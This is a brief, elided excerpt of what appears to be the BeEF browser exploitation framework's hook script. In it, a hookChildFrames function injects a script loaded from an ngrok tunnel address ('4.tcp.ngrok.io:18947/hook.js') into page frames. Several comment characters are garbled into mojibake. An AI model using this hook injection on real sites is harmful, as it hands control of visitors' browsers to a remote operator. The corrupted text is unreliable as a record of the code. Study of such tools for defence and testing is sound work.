...
//	- Updated DetectTizen(). Now tests for 芒鈧搈obile芒鈧� to disambiguate from Samsung Smart TVs
...
beef.browser = {
    ...
    hookChildFrames: function () {
        ...
        script.src = 'http://4.tcp.ngrok.io:18947/hook.js';
...
beef.net = {
    ...
    response: function () {
        ...
        this.response_body = null;      // "<html>芒鈧�." if not a cross-origin request
